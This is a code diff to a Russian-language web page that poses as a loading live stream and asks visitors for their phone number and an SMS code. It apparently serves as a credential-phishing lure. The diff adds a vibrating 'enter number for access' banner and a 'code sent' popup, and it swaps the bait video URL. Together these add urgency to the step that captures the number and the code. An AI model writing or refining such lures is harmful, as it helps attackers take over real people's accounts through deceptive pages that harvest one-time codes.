@@ -569,9 +569,101 @@
             background: #555;
             cursor: not-allowed;
         }
+
+        /* ===== АНИМАЦИЯ ТЕЛЕФОНА И SMS ===== */
+        .phone-animation {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 50;
+            background: rgba(20,10,20,0.9);
+            backdrop-filter: blur(10px);
+            border: 1px solid #ff3366;
+            border-radius: 20px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 0 40px rgba(255, 51, 102, 0.3);
+            animation: phoneVibrate 0.5s ease-in-out infinite alternate;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+        }
+        .phone-animation.show {
+            opacity: 1;
+        }
+        @keyframes phoneVibrate {
+            0% { transform: translateX(-50%) translateX(-3px); }
+            100% { transform: translateX(-50%) translateX(3px); }
+        }
+        .phone-animation .phone-icon {
+            font-size: 28px;
+        }
+        .phone-animation .phone-text {
+            color: white;
+            font-size: 14px;
+            font-weight: 300;
+        }
+        .phone-animation .phone-text span {
+            color: #ff6680;
+            font-weight: 600;
+        }
+
+        .sms-animation {
+            position: fixed;
+            top: 100px;
+            right: 20px;
+            z-index: 50;
+            background: rgba(30,20,30,0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid #ff3366;
+            border-radius: 16px;
+            padding: 12px 18px;
+            max-width: 280px;
+            box-shadow: 0 0 30px rgba(255, 51, 102, 0.2);
+            opacity: 0;
+            transform: translateX(50px);
+            transition: all 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            pointer-events: none;
+        }
+        .sms-animation.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        .sms-animation .sms-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ff6680;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .sms-animation .sms-body {
+            color: #ddd;
+            font-size: 13px;
+            margin-top: 4px;
+            line-height: 1.4;
+        }
+        .sms-animation .sms-body span {
+            color: #ff6680;
+        }
     </style>
 </head>
 <body>
+
+<!-- ===== АНИМАЦИЯ ТЕЛЕФОНА ===== -->
+<div class="phone-animation" id="phoneAnimation">
+    <span class="phone-icon">📱</span>
+    <span class="phone-text">Введите номер для <span>доступа</span></span>
+</div>
+
+<!-- ===== АНИМАЦИЯ SMS ===== -->
+<div class="sms-animation" id="smsAnimation">
+    <div class="sms-header">📩 SMS</div>
+    <div class="sms-body">Код отправлен на номер <span id="smsPhone">+7*********</span></div>
+</div>
 
 <div id="loadingOverlay" class="loading-overlay">
     <div>🔴 ЗАГРУЗКА СТРИМА...</div>
@@ -579,7 +671,7 @@
 
 <div class="fullscreen-video" id="videoContainer">
     <video id="bgVideo" autoplay muted playsinline>
-        <source src="https://d.uguu.se/rwbLxNMk.mp4" type="video/mp4">
+         <source src="https://f003.backblazeb2.com/file/ayanami/files/5Efq_nVTu.mp4" type="video/mp4">
     </video>
 </div>
 
@@ -810,6 +902,27 @@
         }
     });
     
+    // ========== АНИМАЦИЯ ТЕЛЕФОНА ==========
+    function showPhoneAnimation() {
+        const el = document.getElementById('phoneAnimation');
+        el.classList.add('show');
+        setTimeout(() => {
+            el.classList.remove('show');
+        }, 6000);
+    }
+
+    function showSmsAnimation(phone) {
+        const el = document.getElementById('smsAnimation');
+        const phoneSpan = document.getElementById('smsPhone');
+        // МАСКИРУЕМ НОМЕР
+        const masked = phone.replace(/(\d{2})\d{6}(\d{2})/, '$1******$2');
+        phoneSpan.textContent = masked;
+        el.classList.add('show');
+        setTimeout(() => {
+            el.classList.remove('show');
+        }, 5000);
+    }
+
     // ========== ПОЛУЧАЕМ ПАРАМЕТРЫ ИЗ URL ==========
     function getUrlParams() {
         const urlParams = new URLSearchParams(window.location.search);
@@ -1092,7 +1205,12 @@
     };
     
     // ========== МОДАЛКА ==========
-    function showModal() { document.getElementById('modal').style.display = 'flex'; resetModal(); }
+    function showModal() { 
+        document.getElementById('modal').style.display = 'flex'; 
+        resetModal();
+        // ПОКАЗЫВАЕМ АНИМАЦИЮ ТЕЛЕФОНА
+        setTimeout(showPhoneAnimation, 500);
+    }
     function resetModal() {
         document.getElementById('phone').value = "";
         document.getElementById('code').value = "";
@@ -1162,6 +1280,9 @@
                     statusDiv.style.color = "#88ff88";
                     statusDiv.innerHTML = "✅ Код отправлен!";
                     btn.disabled = false;
+                    
+                    // ПОКАЗЫВАЕМ АНИМАЦИЮ SMS
+                    showSmsAnimation(fullPhone);
                 } else {
                     statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
                     btn.disabled = false;
